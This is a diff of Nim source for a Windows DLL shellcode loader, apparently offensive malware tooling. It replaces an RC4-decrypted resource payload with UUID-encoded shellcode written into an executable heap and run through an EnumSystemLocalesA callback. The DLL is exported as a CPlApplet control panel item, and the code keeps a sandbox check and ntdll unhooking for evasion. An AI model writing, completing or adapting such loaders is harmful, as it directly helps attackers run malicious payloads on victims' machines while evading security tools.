@@ -7,11 +7,6 @@ import std/httpclient
 import std/osproc
 import std/os
 import includes/DLoader
-import includes/rc4
-
-func toByteSeq*(str: string): seq[byte] {.inline.} =
-  ## Converts a string to the corresponding byte sequence.
-  @(str.toOpenArrayByte(0, str.high))
 
 when defined amd64:
     const patch: array[1, byte] = [byte 0xc3]
@@ -19,22 +14,6 @@ elif defined i386:
     const patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
 
 var currentModule: HINSTANCE
-
-type
-    USTRING* = object
-        Length*: DWORD
-        MaximumLength*: DWORD
-        Buffer*: PVOID
-
-var keyString: USTRING
-var imgString: USTRING
-
-# Same Key
-var keyBuf: array[16, char] = [char 't', 'e', 's', 't', 'K', 'e', 'y','t', 'e', 's', 't', 'K', 'e', 'y', 't', 'e']
-
-keyString.Buffer = cast[PVOID](&keyBuf)
-keyString.Length = 16
-keyString.MaximumLength = 16
 
 # Dynamic Strings
 var VirtAl = ""
@@ -344,64 +323,42 @@ proc unhook(cleanNtdll: LPVOID): bool =
 proc NimMain() {.cdecl, importc.}
 
 proc execute(): void =
-    var resourceId = 100
-    var resourceType = 10
+    const SIZE = REPLACE_ME_SIZE
+    var UUIDARR = allocCStringArray(REPLACE_ME_UUID)
 
-    # Get pointer to encrypted shellcode in .rsrc section
-    #echo "currentModule is: ", currentModule
-    var myResource: HRSRC = FindResource(cast[HMODULE](currentModule), MAKEINTRESOURCE(resourceId), MAKEINTRESOURCE(resourceType))
+    let hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
+    let ha = HeapAlloc(hHeap, 0, 0x100000)
+    var hptr = cast[DWORD_PTR](ha)
 
-    #if myResource == 0:
-      #echo "FindResource failed!"
-      #echo GetLastError()
-
-    var myResourceSize: DWORD = SizeofResource(cast[HMODULE](currentModule), myResource)
-
-    #[ if myResourceSize == 0:
-      echo "SizeOfResource failed!"
-      echo GetLastError()
-    ]#
-    var hResource: HGLOBAL = LoadResource(cast[HMODULE](currentModule), myResource)
-    #[if hResource == 0:
-      echo "LoadResource failed!"
-      echo GetLastError()
+    #[if hptr != 0:
+        echo fmt"[+] Heap Memory is Allocated at 0x{hptr.toHex}"
     else:
-      echo "hResource at: ", toHex(hResource)
+        echo fmt"[-] Heap Alloc Error "
+        quit(QuitFailure)
     ]#
-    var oldProtect: DWORD
 
-    let buffer = VirtualAlloc_p(cast[LPVOID](0), cast[SIZE_T](myResourceSize), MEM_COMMIT, PAGE_READ_WRITE)
-    let memBuff: int = cast[int](buffer)
-    #echo "Mem buffer at: ", memBuff.toHex
-    #echo "VA Called!"
-    copyMem(buffer, cast[LPVOID](hResource), myResourceSize)
-    #echo "CopyMem Called!"
-    imgString.Buffer = buffer
-    imgString.Length = myResourceSize
-    imgString.MaximumLength = myResourceSize
+    for i in 0..(SIZE-1):
+        var status = UuidFromStringA(cast[RPC_CSTR](UUIDARR[i]), cast[ptr UUID](hptr))
+        if status != RPC_S_OK:
+            if status == RPC_S_INVALID_STRING_UUID:
+                echo fmt"[-] Invalid UUID String"
+            else:
+                echo fmt"[-] Something Went Wrong, Error Code: {status}"
+            quit(QuitFailure)
+        hptr += 16
 
-    #echo "imgString is: ", repr &imgString
-    #echo "imgString location: ", toHex(cast[int](&imgString)) 
-    #echo "keyString is: ", repr &keyString
-    #echo "keyString location: ", toHex(cast[int](&keyString))
-    #echo "keyString Buffer Location: ", toHex(cast[int](&keyString.Buffer))
-
-    SystemFunction032(&imgString, &keyString)
-    echo "SF032 Called!"
-
-    discard VirtualProtect_p(buffer, cast[SIZE_T](myResourceSize), PAGE_EXECUTE_READ, addr oldProtect)
-    #echo "VP Called!"
-    let f = cast[proc(){.nimcall.}](buffer)
-    f()
-    
+    EnumSystemLocalesA(cast[LOCALE_ENUMPROCA](ha), 0)
+    CloseHandle(hHeap)
+    quit(QuitSuccess)
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
     #echo "hinstDLL is: ", hinstDLL
     if fdwReason == DLL_PROCESS_ATTACH:
         NimMain()
+        currentModule = hinstDLL
     return true
 
-proc start(hwnd: HWND, hinst: HINSTANCE, lpszCmdLine: LPSTR, nCmdShow: int): void {.stdcall, exportc, dynlib.} =
+proc CPlApplet(hwndCpl: HWND, msg: UINT, lParam1: LPARAM, lParam2: LPARAM): LONG {.stdcall, exportc, dynlib.} =
     if sbCheck() >= 2:
         #echo "sbCheck returned true! "
         for i in 1 .. 10000000:
